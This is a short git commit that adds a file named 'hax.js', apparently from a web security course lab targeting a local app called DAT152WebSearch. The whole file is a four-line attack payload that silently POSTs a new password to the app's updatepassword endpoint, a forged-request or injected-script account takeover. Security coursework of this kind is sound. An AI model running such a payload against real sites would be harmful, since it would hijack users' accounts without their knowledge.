a2cf02cd07d93730b6e63cbfa6a115e5fd55cd0d
Bjørnar <111509904+h598062@users.noreply.github.com>
2024-11-07 15:20:07 +0100

    Create hax.js

---
+++ hax.js
@@ -0,0 +1,4 @@
+let data = new FormData();
+data.append("passwordnew", 2);
+data.append("confirm_passwordnew", 2);
+fetch("http://localhost:8080/DAT152WebSearch/updatepassword", {method: "POST", body: data});
